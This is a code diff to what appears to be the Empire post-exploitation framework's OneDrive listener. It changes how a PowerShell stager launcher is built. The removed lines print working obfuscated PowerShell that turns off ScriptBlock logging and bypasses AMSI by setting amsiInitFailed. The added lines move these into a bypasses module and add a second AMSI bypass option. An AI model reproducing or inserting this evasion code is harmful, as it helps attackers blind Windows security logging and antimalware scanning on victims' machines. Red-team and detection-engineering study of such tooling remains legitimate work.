@@ -17,6 +17,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 class Listener:
     def __init__(self, mainMenu, params=[]):
@@ -169,7 +170,7 @@ class Listener:
 
         return True
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         if not language:
             print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")
 
@@ -189,36 +190,16 @@ class Listener:
                 launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
-                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
+                    launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
-                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    launcher += "'System.Management.Automation.Utils'"
-                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    launcher += "['ScriptB'+'lockLogging']"
-                    launcher += helpers.randomize_capitalization("){$GPC")
-                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    launcher += helpers.randomize_capitalization("$GPC")
-                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    launcher += "('EnableScriptB'+'lockLogging',0);"
-                    launcher += helpers.randomize_capitalization("$val.Add")
-                    launcher += "('EnableScriptBlockInvocationLogging',0);"
-                    launcher += helpers.randomize_capitalization("$GPC")
-                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    launcher += helpers.randomize_capitalization("=$val}")
-                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    launcher += "'signatures','N'+'onPublic,Static'"
-                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        launcher += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    launcher += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    launcher += "'System.Management.Automation.AmsiUtils'"
-                    launcher += helpers.randomize_capitalization(');$Ref.GetField(')
-                    launcher += "'amsiInitFailed','NonPublic,Static'"
-                    launcher += helpers.randomize_capitalization(").SetValue($null,$true);")
+                    if AMSIBypass:
+                        launcher += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        launcher += bypasses.AMSIBypass2()
                     launcher += "};"
                     launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
